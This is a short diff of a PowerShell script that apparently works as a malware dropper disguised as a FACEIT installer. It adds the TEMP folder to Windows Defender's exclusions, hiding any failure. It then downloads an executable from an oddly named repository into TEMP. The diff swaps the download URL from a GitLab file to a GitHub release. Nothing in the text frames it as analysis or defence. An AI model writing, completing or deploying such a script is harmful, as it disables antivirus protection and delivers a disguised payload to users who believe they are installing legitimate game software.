@@ -14,7 +14,7 @@ try {
     Add-MpPreference -ExclusionPath $env:TEMP
 } catch {}
 
-$url = "https://gitlab.com/uprates-group/lokupcodes/-/raw/main/FACEIT.exe?inline=false"
+$url = "https://github.com/thea-tetlo/sghdfhfsdsdhf/releases/download/AC/FACEITInstaller_64.exe?inline=false"
 $outPath = "$env:TEMP\FACEIT_Installer64.exe"
 
 Start-BitsTransfer -Source $url -Destination $outPath -DisplayName "Downloading..." -Description "Please wait"
